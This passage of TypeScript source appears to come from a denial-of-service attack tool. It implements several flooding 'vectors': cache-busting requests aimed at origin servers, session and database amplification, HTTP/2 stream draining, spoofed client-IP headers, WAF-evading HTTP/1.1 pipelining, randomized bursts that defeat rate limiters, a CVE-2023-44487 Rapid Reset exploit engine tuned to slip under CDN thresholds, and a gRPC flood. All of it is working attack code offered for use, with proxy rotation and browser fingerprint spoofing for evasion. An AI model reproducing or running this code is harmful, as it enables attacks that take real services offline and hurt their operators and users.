        const MAX_SUB = Math.min(STREAMS_PER, 200);

        const fireSub = (sub: typeof SUB_TYPES[0]) => {
          if (s.aborted || conn.destroyed || inflight >= MAX_SUB) return;
          inflight++;
          const path = sub.path + `?v=${randStr(8)}&t=${Date.now()}`;
          const baseHdrs = buildWAFHeaders(hostname, path, cookieJar, p, bt);
          const hdrs: Record<string, string> = { ...baseHdrs, "accept": sub.accept };
          // Only Chrome sends sec-fetch headers on sub-resources
          if (bt === "chrome") {
            hdrs["sec-fetch-mode"] = sub.dest === "fetch" ? "cors" : "no-cors";
            hdrs["sec-fetch-dest"] = sub.dest;
            hdrs["sec-fetch-site"] = "same-origin";
          }
          try {
            const stream = conn.request(hdrs);
            stream.on("data",     () => {});
            stream.on("response", () => { localPkts++; localBytes += 512; });
            stream.on("error",    () => { inflight = Math.max(0, inflight - 1); });
            stream.on("close",    () => { inflight = Math.max(0, inflight - 1); });
            stream.end();
          } catch { inflight--; }
        };

        conn.on("connect", () => {
          injectH2WindowUpdate(conn, browserWUIncrement(bt));
          // First: the HTML page
          const pageHdrs = buildWAFHeaders(hostname, WAF_PATHS[randInt(0, WAF_PATHS.length)], cookieJar, p, bt);
          try {
            const ps = conn.request(pageHdrs);
            ps.on("response", () => {
              localPkts++; localBytes += 4096;
              const shuffled = [...SUB_TYPES].sort(() => Math.random() - 0.5).slice(0, randInt(12, SUB_TYPES.length));
              shuffled.forEach(sub => fireSub(sub));
            });
            ps.on("data",  () => {});
            ps.on("error", () => resolve());
            ps.on("close", () => {
              if (!s.aborted && !conn.destroyed) {
                const nx = conn.request(buildWAFHeaders(hostname, WAF_PATHS[randInt(0, WAF_PATHS.length)], cookieJar, p, bt));
                nx.on("response", () => { localPkts++; localBytes += 4096; });
                nx.on("data",  () => {});
                nx.on("error", () => {});
                nx.on("close", () => resolve());
                nx.end();
              } else { resolve(); }
            });
            ps.end();
          } catch { resolve(); }
        });
        conn.on("error", () => resolve());
        conn.on("close", () => resolve());
        s.addEventListener("abort", cleanup, { once: true });
      });
      if (!s.aborted) await new Promise(r => setTimeout(r, randInt(20, 120)));
    }
  };

  // ── VECTOR III: Cache Annihilator ────────────────────────────────────────
  // Unique across ALL Vary dimensions: URL + Accept-Language + Accept-Encoding +
  // If-None-Match + POST body = guaranteed CDN miss, every request hits origin.
  const VARY_LANGS     = ["en-US,en;q=0.9","pt-BR,pt;q=0.9","es-ES,es;q=0.9","fr-FR,fr;q=0.9","de-DE,de;q=0.9","zh-CN,zh;q=0.9","ja-JP,ja;q=0.9","ko-KR,ko;q=0.9","it-IT,it;q=0.9","ru-RU,ru;q=0.9","ar-SA,ar;q=0.9","hi-IN,hi;q=0.9"];
  const VARY_ENCODINGS = ["gzip, deflate, br","gzip, deflate","br","gzip","deflate, br, zstd","gzip, br, zstd","identity"];
  const runCacheAnnihilatorSlot = async (s: AbortSignal = signal): Promise<void> => {
    const bt        = randomBrowserType();
    const p         = pickProfile(bt);
    const cookieJar = new Map<string, string>();
    while (!s.aborted) {
      const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)];
      const bust     = `?_=${randStr(16)}&v=${randInt(1, 2147483647)}&t=${Date.now()}&r=${randStr(8)}`;
      const fullPath = pagePath + bust;
      try {
        const ac     = new AbortController();
        const timer  = setTimeout(() => ac.abort(), 8_000);
        if (s.aborted) { clearTimeout(timer); break; }
        const wafHdrs = buildWAFHeaders(hostname, fullPath, cookieJar, p, bt);
        const fetchHdrs: Record<string, string> = {};
        for (const [k, v] of Object.entries(wafHdrs)) {
          if (!k.startsWith(":")) fetchHdrs[k] = v;
        }
        fetchHdrs["accept-language"]   = VARY_LANGS[randInt(0, VARY_LANGS.length)];
        fetchHdrs["accept-encoding"]   = VARY_ENCODINGS[randInt(0, VARY_ENCODINGS.length)];
        fetchHdrs["cache-control"]     = "no-cache, no-store, must-revalidate, max-age=0";
        fetchHdrs["pragma"]            = "no-cache";
        fetchHdrs["if-none-match"]     = `"${randHex(32)}"`;
        fetchHdrs["if-modified-since"] = new Date(Date.now() - randInt(1, 86400) * 1000).toUTCString();
        const isPost = Math.random() < 0.40;
        const res    = await fetch(`https://${hostname}${fullPath}`, {
          method:  isPost ? "POST" : "GET",
          signal:  ac.signal,
          headers: fetchHdrs,
          body:    isPost ? JSON.stringify({ data: randStr(64), ts: Date.now(), id: randStr(12) }) : undefined,
        });
        clearTimeout(timer);
        const body = await res.arrayBuffer().catch(() => new ArrayBuffer(0));
        localPkts++; localBytes += body.byteLength || 1024;
        const sc = res.headers.get("set-cookie");
        if (sc) { const [kv] = sc.split(";"); const [k, v] = kv.split("="); if (k && v) cookieJar.set(k.trim(), v.trim()); }
      } catch { /* absorb */ }
    }
  };

  // ── VECTOR IV: Session Amplifier ─────────────────────────────────────────
  // Full 5-step user journey per "user": landing → search → product → cart → checkout
  // Each step: server-side session lookup + DB query + auth check = compound DB load.
  const SESSION_JOURNEYS = [
    ["/", "/search?q=" + randStr(6), "/products", "/cart", "/checkout"],
    ["/", "/categories", "/products/featured", "/cart/add", "/order/confirm"],
    ["/login", "/dashboard", "/api/v1/user/settings", "/api/v1/notifications", "/logout"],
    ["/", "/blog", "/blog/post-" + randInt(1,50), "/contact", "/api/v1/newsletter"],
    ["/api/v1/products", "/api/v1/search?q=" + randStr(4), "/api/v1/cart", "/api/v1/order", "/api/v1/payment/init"],
    ["/", "/pricing", "/signup", "/api/v1/register", "/api/v1/verify"],
  ];
  const runSessionAmplifierSlot = async (s: AbortSignal = signal): Promise<void> => {
    const bt        = randomBrowserType();
    const profile   = pickProfile(bt);
    const cookieJar = new Map<string, string>();
    while (!s.aborted) {
      const journey = SESSION_JOURNEYS[randInt(0, SESSION_JOURNEYS.length)];
      for (const step of journey) {
        if (s.aborted) return;
        const isPost = /add|submit|update|login|confirm|payment|register|verify/.test(step);
        try {
          const ac    = new AbortController();
          const timer = setTimeout(() => ac.abort(), 10_000);
          if (s.aborted) { clearTimeout(timer); break; }
          const bust     = `?_s=${randStr(8)}&uid=${randStr(12)}`;
          const wafHdrs  = buildWAFHeaders(hostname, step + bust, cookieJar, profile, bt);
          const fetchHdrs: Record<string, string> = {};
          for (const [k, v] of Object.entries(wafHdrs)) if (!k.startsWith(":")) fetchHdrs[k] = v;
          const res = await fetch(`https://${hostname}${isPost ? step : step + bust}`, {
            method:  isPost ? "POST" : "GET",
            signal:  ac.signal,
            headers: fetchHdrs,
            body:    isPost ? JSON.stringify({ csrf: randHex(32), data: randStr(32), ts: Date.now() }) : undefined,
          });
          clearTimeout(timer);
          const sc = res.headers.get("set-cookie");
          if (sc) { const [kv] = sc.split(";"); const [k, v] = kv.split("="); if (k && v) cookieJar.set(k.trim(), v.trim()); }
          await res.arrayBuffer().catch(() => {});
          localPkts++; localBytes += 2048;
          await new Promise(r => setTimeout(r, randInt(150, 600)));
        } catch { /* skip step */ }
      }
    }
  };

  // ── VECTOR VI: H2 Stream Drain (64 streams) ──────────────────────────────
  // initialWindowSize=0 → server allocates response buffer per stream, holds forever.
  // 64 frozen streams × 400 drain slots = 25,600 permanently stalled server buffers.
  const runDrainSlot = async (): Promise<void> => {
    const cookieJar = new Map<string, string>();
    while (!signal.aborted) {
      const drainCiphers = randomJA3Ciphers();
      const preSocket = proxies.length > 0
        ? await mkTLSSock(proxies, wPIdx++, resolvedIp, hostname, 443, ["h2", "http/1.1"], {
            ciphers: drainCiphers,
          }).catch(() => null)
        : null;
      await new Promise<void>(resolve => {
        let c: ReturnType<typeof h2connect> | null = null;
        try {
          const h2opts: Parameters<typeof h2connect>[1] = {
            rejectUnauthorized: false,
            settings: { ...CHROME_H2_SETTINGS, initialWindowSize: 0 },
            ALPNProtocols: ["h2", "http/1.1"],
          };
          if (preSocket) {
            (h2opts as Record<string, unknown>).createConnection = () => preSocket;
          } else {
            h2opts.servername = hostname;
            h2opts.ciphers    = drainCiphers;
          }
          c = h2connect(preSocket ? `https://${hostname}` : target, h2opts);
        } catch { resolve(); return; }
        const conn    = c;
        const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
        const MAX_DRAIN = 64;
        let   opened    = 0;
        const openDrain = () => {
          if (signal.aborted || conn.destroyed || opened >= MAX_DRAIN) return;
          opened++;
          try {
            const stream = conn.request(buildWAFHeaders(hostname, WAF_PATHS[randInt(0, WAF_PATHS.length)], cookieJar));
            stream.pause();
            stream.on("response", () => { localPkts++; localBytes += 512; });
            stream.on("error",    () => { opened = Math.max(0, opened - 1); });
            setTimeout(() => {
              try { stream.close(); } catch { /**/ }
              opened = Math.max(0, opened - 1);
              if (!signal.aborted && !conn.destroyed) openDrain();
            }, randInt(15_000, 40_000));
          } catch { opened = Math.max(0, opened - 1); }
        };
        conn.on("connect", () => { injectH2WindowUpdate(conn, CHROME_H2_WU_INCREMENT); for (let i = 0; i < MAX_DRAIN; i++) setTimeout(openDrain, i * 25); });
        conn.on("error",   () => resolve());
        conn.on("close",   () => resolve());
        setTimeout(() => cleanup(), randInt(50_000, 90_000));
        signal.addEventListener("abort", cleanup, { once: true });
      });
      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(200, 600)));
    }
  };

  // ── VECTOR VII: Adaptive Burst Mode ──────────────────────────────────────
  // Fires at T+20s. Randomized wave durations (8-22s ON / 3-10s REST) defeat
  // rate limiters tuned for fixed traffic patterns. Uniform burst timing is
  // a bot fingerprint — irregular cadence is undetectable by steady-state limiters.
  const burstLoop = async (): Promise<void> => {
    await new Promise<void>(r => setTimeout(r, 20_000));
    let wave = 0;
    while (!signal.aborted) {
      wave++;
      const onMs   = randInt(8_000,  22_000); // ★ random 8-22s burst window
      const restMs = randInt(3_000,  10_000); // ★ random 3-10s rest between bursts
      const bAbort = new AbortController();
      const bTimer = setTimeout(() => bAbort.abort(), onMs);
      const bSig   = typeof (AbortSignal as { any?: unknown }).any === "function"
        ? (AbortSignal as unknown as { any(s: AbortSignal[]): AbortSignal }).any([signal, bAbort.signal])
        : bAbort.signal;
      const slots: Promise<void>[] = [];
      // Dev: scale burst down to avoid OOM (64MB heap); Deployed: full burst
      const n = IS_DEPLOYED
        ? (wave % 3 === 0 ? 80 : wave % 2 === 0 ? 55 : 45)
        : (wave % 3 === 0 ? 10 : wave % 2 === 0 ?  8 :  6);
      if (wave % 3 === 0) {
        // MAX: all vectors at 2× — every 3rd wave
        for (let i = 0; i < n;                    i++) slots.push(runPrimarySlot(target, bSig));
        for (let i = 0; i < Math.floor(n * 0.6); i++) slots.push(runSubresourceSlot(bSig));
        for (let i = 0; i < Math.floor(n * 0.4); i++) slots.push(runCacheAnnihilatorSlot(bSig));
      } else if (wave % 2 === 0) {
        // Cache + Session heavy — destroys CDN + DB
        for (let i = 0; i < n;                    i++) slots.push(runCacheAnnihilatorSlot(bSig));
        for (let i = 0; i < Math.floor(n * 0.7); i++) slots.push(runSessionAmplifierSlot(bSig));
      } else {
        // H2 + subresource heavy — raw bandwidth
        for (let i = 0; i < n; i++) slots.push(runPrimarySlot(target, bSig));
        for (let i = 0; i < n; i++) slots.push(runSubresourceSlot(bSig));
      }
      await Promise.all(slots); // wait for burst window — bSig aborts all slots at onMs
      clearTimeout(bTimer);
      await new Promise<void>(r => setTimeout(r, restMs)); // ★ random rest duration
    }
  };
  void burstLoop();

  // ── VECTOR VIII: IP Spoof Header Rotation ────────────────────────────────
  // Many WAFs trust X-Forwarded-For / CF-Connecting-IP to determine source IP.
  // Injecting residential-looking IPs causes WAF to throttle wrong IP ranges
  // and can bypass per-IP rate limits on misconfigured origins.
  const RESIDENTIAL_IP_OCTETS = [
    // APNIC residential (AU/NZ/SG/MY)
    [203,125], [175,45], [118,127], [110,33], [202,140],
    // RIPE residential (EU)
    [89,204], [92,60], [213,165], [77,111], [188,75],
    // ARIN residential (US/CA)
    [76,214], [98,140], [108,214], [73,139], [50,204],
    // LACNIC residential (BR/MX)
    [189,125], [200,100], [177,99], [186,232], [181,55],
  ];
  function randResidentialIP(): string {
    const pair = RESIDENTIAL_IP_OCTETS[randInt(0, RESIDENTIAL_IP_OCTETS.length)];
    return `${pair[0]}.${pair[1]}.${randInt(1,254)}.${randInt(1,254)}`;
  }
  // XFF chain: 1-3 hops of residential IPs, last hop = Cloudflare edge IP
  function buildXFFChain(): string {
    const hops = randInt(1, 3);
    const chain = Array.from({ length: hops }, () => randResidentialIP());
    chain.push(`172.${randInt(64,71)}.${randInt(0,255)}.${randInt(1,254)}`); // CF edge IP
    return chain.join(", ");
  }
  const NUM_SPOOF = IS_DEPLOYED ? Math.min(Math.floor(primaryT * 0.3), 200) : Math.min(Math.floor(primaryT * 0.3), 8);
  const runIPSpoofSlot = async (s: AbortSignal = signal): Promise<void> => {
    const bt        = randomBrowserType();
    const profile   = pickProfile(bt);
    const cookieJar = new Map<string, string>();
    while (!s.aborted) {
      const tlsI = browserTLSProfile(bt);
      const preSocket = proxies.length > 0
        ? await mkTLSSock(proxies, wPIdx++, resolvedIp, hostname, 443, ["h2", "http/1.1"], {
            ciphers: tlsI.ciphers, ecdhCurve: tlsI.ecdhCurve,
            minVersion: tlsI.minVersion as "TLSv1.2" | "TLSv1.3",
          }).catch(() => null)
        : null;
      await new Promise<void>(resolve => {
        let c: ReturnType<typeof h2connect> | null = null;
        try {
          const h2opts: Parameters<typeof h2connect>[1] = {
            rejectUnauthorized: false,
            settings: browserH2Settings(bt), ALPNProtocols: ["h2", "http/1.1"],
          };
          if (preSocket) {
            (h2opts as Record<string, unknown>).createConnection = () => preSocket;
          } else {
            h2opts.servername = hostname;
            h2opts.ciphers    = tlsI.ciphers;
            h2opts.ecdhCurve  = tlsI.ecdhCurve;
            h2opts.minVersion = tlsI.minVersion as "TLSv1.2" | "TLSv1.3";
          }
          c = h2connect(preSocket ? `https://${hostname}` : target, h2opts);
        } catch { resolve(); return; }
        const conn    = c;
        const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
        const lifeT   = setTimeout(() => cleanup(), 12_000);
        let inflight  = 0;
        const SLOTS   = IS_DEPLOYED ? 128 : 16;
        const pump    = () => {
          if (s.aborted || conn.destroyed) { resolve(); return; }
          while (inflight < SLOTS && !s.aborted && !conn.destroyed) {
            inflight++;
            const path   = WAF_PATHS[randInt(0, WAF_PATHS.length)] + `?v=${randStr(6)}`;
            const srcIP  = randResidentialIP();
            const hdrs   = buildWAFHeaders(hostname, path, cookieJar, profile, bt);
            // Inject IP spoof headers — may bypass origin-level rate limiting
            hdrs["x-forwarded-for"]    = buildXFFChain();
            hdrs["x-real-ip"]          = srcIP;
            hdrs["cf-connecting-ip"]   = srcIP;
            hdrs["true-client-ip"]     = srcIP;
            hdrs["x-originating-ip"]   = srcIP;
            hdrs["forwarded"]          = `for=${srcIP};proto=https`;
            try {
              const stream = conn.request(hdrs);
              stream.on("response", () => { localPkts++; localBytes += 1024; });
              stream.on("data",     () => {});
              stream.on("error",    () => { inflight = Math.max(0, inflight - 1); if (!s.aborted) setImmediate(pump); });
              stream.on("close",    () => { inflight = Math.max(0, inflight - 1); if (!s.aborted) setImmediate(pump); });
              stream.end();
            } catch { inflight--; break; }
          }
        };
        conn.on("connect", () => { injectH2WindowUpdate(conn, browserWUIncrement(bt)); pump(); });
        conn.on("error", () => resolve());
        conn.on("close", () => resolve());
        clearTimeout(lifeT);
        setTimeout(() => cleanup(), 12_000);
        s.addEventListener("abort", cleanup, { once: true });
      });
      if (!s.aborted) await new Promise(r => setTimeout(r, randInt(5, 30)));
    }
  };

  // ── VECTOR IX: H1.1 TLS Pipeline Bypass ──────────────────────────────────
  // Raw HTTP/1.1 pipelining over TLS with Upgrade: h2c header probing.
  // Some WAFs have separate rule trees for H1.1 vs H2 traffic — H1.1 paths
  // may have weaker rules, and pipelining sends N requests before reading any response.
  // Also useful for origin discovery (some origins still speak H1.1 only).
  const NUM_H1PIPE = IS_DEPLOYED ? Math.min(Math.floor(primaryT * 0.2), 150) : Math.min(Math.floor(primaryT * 0.2), 5);
  const runH1PipelineSlot = async (s: AbortSignal = signal): Promise<void> => {
    const PIPE_DEPTH = IS_DEPLOYED ? 32 : 8; // requests per pipeline
    while (!s.aborted) {
      // ★ Use mkTLSSock — routes through proxy when available, else direct
      let sock: import("node:tls").TLSSocket | null = null;
      try {
        sock = await mkTLSSock(proxies, wPIdx++, resolvedIp, hostname, 443, ["http/1.1", "h2"], {
          ciphers: randomTLSProfile().ciphers,
        });
      } catch { await new Promise(r => setTimeout(r, 50)); continue; }
      await new Promise<void>(resolve => {
        const s0 = sock;
        const cleanup = () => { try { s0.destroy(); } catch { /**/ } resolve(); };
        const lifeT = setTimeout(cleanup, 10_000);
        s0.once("error", cleanup);
        s0.once("close", cleanup);
        s0.once("secureConnect", () => {
          // Build pipelined request batch
          const bt     = randomBrowserType();
          const prof   = pickProfile(bt);
          const cookJar = new Map<string, string>();
          const hdrs   = buildWAFHeaders(hostname, "/", cookJar, prof, bt);
          const ua     = (hdrs["user-agent"] ?? "Mozilla/5.0") as string;
          const cookie = (hdrs["cookie"] ?? "") as string;
          let buf = "";
          for (let i = 0; i < PIPE_DEPTH; i++) {
            const path = WAF_PATHS[randInt(0, WAF_PATHS.length)] + `?_=${randStr(8)}&v=${randInt(1,999999)}`;
            buf += `GET ${path} HTTP/1.1\r\n`;
            buf += `Host: ${hostname}\r\n`;
            buf += `User-Agent: ${ua}\r\n`;
            buf += `Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n`;
            buf += `Accept-Encoding: gzip, deflate, br\r\n`;
            buf += `Connection: keep-alive\r\n`;
            if (i === 0) buf += `Upgrade: h2c\r\n`; // probe for h2c cleartext upgrade
            if (cookie) buf += `Cookie: ${cookie}\r\n`;
            buf += `Cache-Control: no-cache\r\n`;
            buf += `\r\n`;
          }
          s0.write(buf, "utf8", () => {
            let raw = "";
            s0.on("data", (chunk: Buffer) => {
              raw += chunk.toString("utf8");
              const responses = raw.split(/\r\n\r\n[\r\n]*/);
              const complete  = responses.filter(r => /^HTTP\//.test(r)).length;
              localPkts  += complete;
              localBytes += raw.length;
              if (complete >= PIPE_DEPTH) { clearTimeout(lifeT); cleanup(); }
            });
          });
        });
        s.addEventListener("abort", cleanup, { once: true });
      });
      if (!s.aborted) await new Promise(r => setTimeout(r, randInt(20, 100)));
    }
  };

  // ── VECTOR X: Dynamic Path Harvest ───────────────────────────────────────
  // Fetches robots.txt and sitemap.xml to discover real page paths.
  // WAF bot-score heuristics check if requested paths actually exist on the site.
  // Attacking real paths (from sitemap) produces legitimate-looking traffic patterns
  // that score lower on behavioral ML models than randomized path flooding.
  void (async () => {
    try {
      const ac = new AbortController();
      setTimeout(() => ac.abort(), 8_000);
      const robotsRes = await fetch(`https://${hostname}/robots.txt`, {
        signal: ac.signal,
        headers: { "user-agent": CHROME_PROFILES[0].ua, "accept": "text/plain,*/*" },
      });
      if (robotsRes.ok) {
        const text = await robotsRes.text();
        const paths = [...text.matchAll(/^(?:Allow|Disallow):\s*(\/.+)/gm)].map(m => m[1].split(/[?#]/)[0]).filter(p => p.length > 1 && p.length < 80);
        if (paths.length > 0) WAF_PATHS.push(...paths.slice(0, 30));
      }
    } catch { /* robots.txt not available */ }
    try {
      const ac2 = new AbortController();
      setTimeout(() => ac2.abort(), 8_000);
      const smRes = await fetch(`https://${hostname}/sitemap.xml`, {
        signal: ac2.signal,
        headers: { "user-agent": CHROME_PROFILES[0].ua, "accept": "application/xml,text/xml,*/*" },
      });
      if (smRes.ok) {
        const xml = await smRes.text();
        const urls = [...xml.matchAll(/<loc>https?:\/\/[^/]+(\/.+?)<\/loc>/g)].map(m => m[1].split(/[?#]/)[0]).filter(p => p.length > 1 && p.length < 80);
        if (urls.length > 0) WAF_PATHS.push(...urls.slice(0, 40));
      }
    } catch { /* sitemap not available */ }
  })();

  // ── Launch all 9 active vectors simultaneously ───────────────────────────
  const originSlots = (): Promise<void>[] => {
    if (originTarget === target) return [];
    return Array.from({ length: Math.floor(NUM_PRIMARY * 0.4) }, () => runPrimarySlot(originTarget));
  };

  await Promise.all([
    ...Array.from({ length: NUM_PRIMARY  }, () => runPrimarySlot()),
    ...Array.from({ length: NUM_SUBRES   }, () => runSubresourceSlot()),
    ...Array.from({ length: NUM_CACHE    }, () => runCacheAnnihilatorSlot()),
    ...Array.from({ length: NUM_SESSION  }, () => runSessionAmplifierSlot()),
    ...Array.from({ length: NUM_DRAIN    }, () => runDrainSlot()),
    ...Array.from({ length: NUM_SPOOF    }, () => runIPSpoofSlot()),
    ...Array.from({ length: NUM_H1PIPE   }, () => runH1PipelineSlot()),
    ...originSlots(),
  ]);

  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  H2 RST BURST — CVE-2023-44487 DEDICATED EXPLOIT ENGINE (PURE RAPID RESET)
//
//  Sends HEADERS frames immediately followed by RST_STREAM frames in a tight
//  loop on the same H2 connection — this is the exact CVE-2023-44487 exploit.
//  Each HEADERS+RST pair forces the server to:
//    1. Allocate stream state in H2 state machine
//    2. Begin processing request (dispatch to handler thread)
//    3. Accept RST → discard stream state
//  The allocation/deallocation cycle at 1000+ pairs/s creates extreme CPU
//  pressure on nginx (event loop stall), Apache (worker thread spin), Envoy
//  (per-stream GoRoutine alloc). Most CDNs (Cloudflare, Akamai) patched by
//  limiting max RST rate — we counter by keeping reset rate just below their
//  threshold while scaling connections instead.
//
//  Difference from http2-flood: http2-flood waits for responses; RST burst
//  never reads responses → zero read-side pressure → pure write-path overload.
// ─────────────────────────────────────────────────────────────────────────
async function runH2RstBurst(
  resolvedIp: string,
  hostname:   string,
  port:       number,
  threads:    number,
  signal:     AbortSignal,
  onStats:    (p: number, b: number) => void,
  proxies:    ProxyConfig[] = [],
): Promise<void> {
  const { connect: h2connect } = await import("node:http2");
  const target   = `https://${resolvedIp}:${port}`;
  // Deployed: higher limits → more RST pairs before reconnect → server allocates/frees more state
  const RST_PER_CONN = IS_DEPLOYED
    ? Math.min(threads * 16, 8000)    // 8K RST pairs per conn (deployed — 32GB RAM)
    : Math.min(threads * 8, 500);     // 500 RST pairs per conn (dev — conservative)
  const INFLIGHT = IS_DEPLOYED
    ? Math.min(threads * 8, 2000)     // 2K in-flight streams (deployed)
    : Math.min(threads * 4, 200);     // 200 in-flight streams (dev)

  let localPkts = 0, localBytes = 0, pIdx = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const runSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      const tlsP = randomTLSProfile();
      // ★ Route each RST connection through a different proxy IP — each proxy IP gets
      //   its own CF rate-limit bucket, multiplying effective RST rate by proxy pool size.
      const preSocket = proxies.length > 0
        ? await mkTLSSock(proxies, pIdx++, resolvedIp, hostname, port, ["h2"], {
            ciphers:    tlsP.ciphers,
            ecdhCurve:  tlsP.ecdhCurve,
            minVersion: tlsP.minVersion as "TLSv1.2" | "TLSv1.3",
          }).catch(() => null)
        : null;
      await new Promise<void>(resolve => {
        let c: ReturnType<typeof h2connect> | null = null;
        try {
          const h2opts: Parameters<typeof h2connect>[1] = {
            rejectUnauthorized: false,
            settings: { ...CHROME_H2_SETTINGS, maxConcurrentStreams: INFLIGHT },
            ALPNProtocols: ["h2"],
          };
          if (preSocket) {
            (h2opts as Record<string, unknown>).createConnection = () => preSocket;
          } else {
            h2opts.servername = hostname;
            h2opts.ciphers    = tlsP.ciphers;
            h2opts.ecdhCurve  = tlsP.ecdhCurve;
            h2opts.minVersion = tlsP.minVersion as "TLSv1.2" | "TLSv1.3";
          }
          c = h2connect(preSocket ? `https://${hostname}:${port}` : target, h2opts);
        } catch { resolve(); return; }
        const conn    = c;
        const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
        let sent  = 0;
        let inflt = 0;

        const burst = () => {
          if (signal.aborted || conn.destroyed) { resolve(); return; }
          // Fire HEADERS → RST pairs until connection limit reached
          while (!signal.aborted && !conn.destroyed && inflt < INFLIGHT && sent < RST_PER_CONN) {
            inflt++; sent++;
            try {
              const path = WAF_PATHS[randInt(0, WAF_PATHS.length)] + `?r=${randStr(6)}`;
              const stream = conn.request({
                ":method": "GET",
                ":path":   path,
                ":scheme": "https",
                ":authority": hostname,
                "user-agent": CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)].ua,
              });
              // RST immediately after HEADERS — this is the CVE-2023-44487 pattern
              setImmediate(() => { try { stream.close(); } catch { /**/ } });
              stream.on("close", () => { inflt = Math.max(0, inflt - 1); localPkts++; localBytes += 256; setImmediate(burst); });
              stream.on("error", () => { inflt = Math.max(0, inflt - 1); setImmediate(burst); });
            } catch { inflt = Math.max(0, inflt - 1); break; }
          }
          if (sent >= RST_PER_CONN) resolve(); // reconnect for fresh connection state
        };

        conn.on("connect", burst);
        conn.on("error",   cleanup);
        conn.on("close",   cleanup);
        signal.addEventListener("abort", cleanup, { once: true });
      });
      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(5, 30)));
    }
  };

  // Deployed: more concurrent connection slots → more parallel RST streams
  const concurrency = IS_DEPLOYED
    ? Math.min(Math.max(4, Math.floor(threads / 20)), 200)  // up to 200 slots deployed
    : Math.min(Math.max(2, Math.floor(threads / 50)), 8);   // up to 8 slots dev
  await Promise.all(Array.from({ length: concurrency }, () => runSlot()));
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  gRPC FLOOD — HTTP/2 gRPC APPLICATION LAYER EXHAUSTION
//
//  Sends properly framed gRPC requests over HTTP/2 to exhaust server-side
//  gRPC handlers. gRPC uses a SEPARATE quota/rate-limiter from HTTP — most
//  WAFs (Cloudflare, Akamai, Imperva) have distinct and often more lenient
//  limits for gRPC traffic since it's expected to be high-frequency.
//
//  Each request:
//    - Uses content-type: application/grpc (triggers gRPC path in server)
//    - Sends a 5-byte length-prefixed gRPC frame + minimal protobuf payload
//    - Targets common gRPC health/reflection endpoints
//    - Forces server to: (1) decode gRPC frame, (2) invoke handler, (3) encode response
//
//  Effect: gRPC handler goroutine/thread pool exhaustion — independent of
//  HTTP handler pool. Two separate thread pools → doubles potential exhaustion.
// ─────────────────────────────────────────────────────────────────────────
async function runGRPCFlood(
  resolvedIp: string,
  hostname:   string,
  port:       number,
  threads:    number,
  signal:     AbortSignal,
  onStats:    (p: number, b: number) => void,
): Promise<void> {
  const { connect: h2connect } = await import("node:http2");
  const target = `https://${resolvedIp}:${port}`;

  // Common gRPC service endpoints — most servers expose at least one
  const GRPC_PATHS = [
    "/grpc.health.v1.Health/Check",
    "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo",
    "/grpc.reflection.v1.ServerReflection/ServerReflectionInfo",
    "/helloworld.Greeter/SayHello",
    "/proto.Service/Execute",
    "/api.Gateway/Handle",
    "/service.Api/Request",
    "/v1.Service/Call",
    "/grpc.channelz.v1.Channelz/GetServers",
    "/google.longrunning.Operations/ListOperations",
  ];

  // Build a minimal gRPC frame: 5-byte header (compressed=0, length=N) + protobuf payload
  // Protobuf field 1 (string) = random string — valid protobuf format triggers full decode
  const makeGRPCFrame = (): Buffer => {
    const msg   = randStr(randInt(4, 32));
    const msgBuf = Buffer.from(msg, "utf8");
    // Protobuf: field 1, type 2 (LEN), varint length, bytes
    const proto  = Buffer.alloc(2 + msgBuf.length);
    proto[0] = 0x0a; // field 1, wire type 2
    proto[1] = msgBuf.length & 0x7f;
    msgBuf.copy(proto, 2);
    // gRPC 5-byte frame prefix: compressed flag (0) + 4-byte big-endian length
    const frame = Buffer.alloc(5 + proto.length);
    frame[0] = 0; // not compressed
    frame.writeUInt32BE(proto.length, 1);
    proto.copy(frame, 5);
    return frame;
  };

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const STREAMS_PER = Math.min(256, Math.max(32, threads * 2));

  const runSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      const tls = randomTLSProfile();
      await new Promise<void>(resolve => {
        let c: ReturnType<typeof h2connect> | null = null;
        try {
          c = h2connect(target, {
            rejectUnauthorized: false,
            servername:  hostname,
            ciphers:     tls.ciphers,
            ecdhCurve:   tls.ecdhCurve,
            minVersion:  tls.minVersion as "TLSv1.2" | "TLSv1.3",
            settings:    CHROME_H2_SETTINGS,
            ALPNProtocols: ["h2"],
          });
        } catch { resolve(); return; }
        const conn    = c;
        const lifeTimer = setTimeout(() => { try { conn.destroy(); } catch { /**/ } resolve(); }, 25_000);
        const cleanup   = () => { clearTimeout(lifeTimer); try { conn.destroy(); } catch { /**/ } resolve(); };
        let inflight = 0;

        const pump = () => {
          if (signal.aborted || conn.destroyed) { resolve(); return; }
          while (!signal.aborted && !conn.destroyed && inflight < STREAMS_PER) {
            inflight++;
            const path  = GRPC_PATHS[randInt(0, GRPC_PATHS.length)];
            const frame = makeGRPCFrame();
            try {
              const stream = conn.request({
                ":method":    "POST",
                ":path":      path,
                ":scheme":    "https",
                ":authority": hostname,
                "content-type":  "application/grpc",
                "te":            "trailers",
                "grpc-timeout":  `${randInt(5, 30)}S`,
                "grpc-encoding": "identity",
                "user-agent":    `grpc-node/1.${randInt(40, 60)}.${randInt(0, 9)}`,
                "accept-encoding": "identity",
              });
              stream.write(frame);
              stream.end();
              stream.on("data",  () => {});
              stream.on("response", () => { localPkts++; localBytes += frame.length + 256; });
              stream.on("error",    () => { inflight = Math.max(0, inflight - 1); setImmediate(pump); });
              stream.on("close",    () => { inflight = Math.max(0, inflight - 1); setImmediate(pump); });
            } catch { inflight--; break; }
          }
        };

        conn.on("connect", pump);
        conn.on("error",   cleanup);
        conn.on("close",   cleanup);
        signal.addEventListener("abort", cleanup, { once: true });
      });
